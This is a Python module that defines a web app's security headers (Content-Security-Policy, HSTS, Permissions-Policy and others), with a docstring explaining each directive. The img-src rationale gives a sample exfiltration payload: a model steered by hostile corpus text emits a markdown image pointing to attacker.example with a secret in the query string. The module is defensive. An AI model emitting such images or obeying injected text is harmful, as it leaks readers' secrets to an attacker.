"""The Content-Security-Policy this app sends (agent-forge-harness-va8).

This is the SECOND of two layers. The first is `ui/src/components/Markdown.tsx`,
which drops every remote subresource out of model-authored markdown before it
reaches the DOM. This one is what protects the rest of the page, and what stops
a hole anywhere else in the app becoming the same exfiltration channel.

It lives in its own module, and not inline in `app.py`, because the policy has
to be byte-identical in two places — here and in the `server` block of
`ui/nginx.conf`, since nginx serves the SPA in Compose and in the browser E2E
while `app.py` serves it in production, and a header set in only one of them
means E2E tests a different posture from production (threat model R-6). One
constant is what lets `tests/test_security_headers_contract.py` compare the two
and fail when they drift.

Directive by directive:

``img-src 'self' data: blob:``
    The exfiltration channel this bead exists to close: a model steered by
    hostile corpus text emits ``![](https://attacker.example/?d=<secret>)`` and
    the reader's browser fetches it, handing the attacker the URL. ``data:`` and
    ``blob:`` stay because Vite inlines small imported images as ``data:`` URIs
    at build time; neither can reach a third-party host, and the markdown
    sanitiser drops a ``data:`` image of its own accord, so this only widens
    what the application's OWN bundle may render.

``connect-src 'self'``
    The other half of the same channel: fetch/XHR/WebSocket/``sendBeacon`` to a
    third-party origin. The SPA talks only to its own origin.

``object-src 'none'``
    ``<object>``/``<embed>``/``<applet>``. The app uses none, and they are a
    long-standing plugin-content bypass.

``base-uri 'self'``
    Stops an injected ``<base href>`` silently re-pointing every relative URL on
    the page, including the ones this policy would otherwise have allowed.

``frame-ancestors 'none'``
    Clickjacking. Nothing legitimately frames this app, and the sign-in screen
    is worth protecting today rather than at the first Workbench route.

Deliberately NOT in the CSP, so that a production security fix stays small and
reviewable: ``default-src``, ``script-src``, ``style-src``, ``font-src``.
``ui/index.html`` carries an inline ``<script>`` that restores the saved theme
before paint, and any ``script-src`` without a hash or ``'unsafe-inline'`` kills
it — while ``default-src`` would reach ``script-src`` by falling back. The
``style`` attributes that survive the markdown sanitiser are ``style-src-attr``'s
business. Those, and the table/enrolment pages' own stricter policy (SEC-17's
``default-src 'self'; ...`` plus ``Referrer-Policy: no-referrer`` and
``Cross-Origin-Resource-Policy: same-origin``), belong to the bead that writes
SEC-17's full table-page policy (1kg.9.5); the self-hosted VAD model and WASM
allowances belong to 1ir.9.1.

The four headers below (agent-forge-harness-y58 / SEC-17) round out what SEC-17
asked this bead to review, for every OTHER page — the non-table, non-enrolment
majority of the app that only this middleware and `ui/nginx.conf` front. The
decision record, including why each is safe to ship unconditionally today,
lives next to this rationale at
``docs/adr/security-headers-non-table-pages.md``.

``X-Content-Type-Options: nosniff``
    Stops a browser MIME-sniffing a response into something more dangerous
    than its declared type. SEC-17 named this one explicitly; nothing in this
    app needs it relaxed, so it ships unconditionally.

``Referrer-Policy: strict-origin-when-cross-origin``
    A cross-origin request carries only this origin, never a path or query; a
    downgrade to plain HTTP carries nothing. The table and enrolment pages take
    SEC-17/SEC-12's stricter ``no-referrer`` instead — a table address must
    never leave this origin at all — which is why this value is not simply
    reused there.

``Cross-Origin-Opener-Policy: same-origin``
    Isolates this app's browsing-context group from any window it opens or is
    opened by. Sign-in has no OAuth popup and nothing in this app calls
    `window.open` or reads `window.opener`, so there is no flow to break.

``Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()``
    Denies all four to every frame, `self` included — this app has no feature
    that uses any of them yet. It is sent on EVERY page, by the middleware and
    by nginx's `server` block, so it is NOT where
    `agent-forge-harness-1ir.3.4`'s microphone grant goes: ``microphone=(self)``
    here would grant it app-wide, where SEC-17 allows it on GM pages only.
    1ir.3.4 sends its own value on the GM pages' responses instead (kept by the
    ``setdefault`` below) plus an nginx equivalent, and this constant keeps
    denying everywhere else. ``payment`` is denied because Stripe is not
    integrated (`xiu-yje`); that decision is the one to revisit here.

``Strict-Transport-Security: max-age=31536000; includeSubDomains``
    agent-forge-harness-5ir1 (release review S9). Until now HTTPS rested on the
    ``.app`` TLD's place on the browsers' preload list, which stops holding the
    day a custom domain is put in front (agent-forge-harness-na7). One year is
    the floor the preload list itself asks for; ``includeSubDomains`` because
    nothing under this host serves plain HTTP — na7 must keep that true of a
    custom domain's subdomains, or narrow this. No ``preload``: that
    submits the domain to a list that is slow to leave, which is an owner's
    decision, not a header's. A browser ignores the header on a plain-HTTP
    response, so Compose and the E2E (nginx on ``http://localhost``) are
    unaffected.

A route may set a policy of its own and keep it: the middleware in `app.py`
uses ``setdefault`` for every header below, so the asset route of SEC-19 can
answer with ``default-src 'none'; sandbox``, and a table page with
``no-referrer``, without having to unpick this.
`service/tests/test_security_headers.py` pins that for all six headers.
"""

from __future__ import annotations

from typing import Final

#: Sent by `service.app`'s `set_security_headers` middleware and, byte for byte,
#: by `add_header Content-Security-Policy ... always;` in `ui/nginx.conf`.
#: `tests/test_security_headers_contract.py` fails if the two ever differ.
CONTENT_SECURITY_POLICY: Final[str] = (
    "img-src 'self' data: blob:; "
    "connect-src 'self'; "
    "object-src 'none'; "
    "base-uri 'self'; "
    "frame-ancestors 'none'"
)

#: SEC-17's named header. Sent by the same middleware and, byte for byte, by
#: `ui/nginx.conf`; guarded by `tests/test_security_headers_contract.py`.
X_CONTENT_TYPE_OPTIONS: Final[str] = "nosniff"

#: Non-table-page decision (docs/adr/security-headers-non-table-pages.md). The
#: table and enrolment pages will instead send SEC-17/SEC-12's `no-referrer`.
REFERRER_POLICY: Final[str] = "strict-origin-when-cross-origin"

#: Non-table-page decision (docs/adr/security-headers-non-table-pages.md).
CROSS_ORIGIN_OPENER_POLICY: Final[str] = "same-origin"

#: Non-table-page decision (docs/adr/security-headers-non-table-pages.md).
#: Sent on EVERY page, so it stays a denial: `agent-forge-harness-1ir.3.4`'s
#: `microphone=(self)` goes on the GM pages' own responses (kept by the
#: middleware's `setdefault`), never here, where it would grant it app-wide.
PERMISSIONS_POLICY: Final[str] = "camera=(), microphone=(), geolocation=(), payment=()"

#: agent-forge-harness-5ir1. Sent by the same middleware and, byte for byte, by
#: `ui/nginx.conf`; guarded by `tests/test_security_headers_contract.py`.
STRICT_TRANSPORT_SECURITY: Final[str] = "max-age=31536000; includeSubDomains"
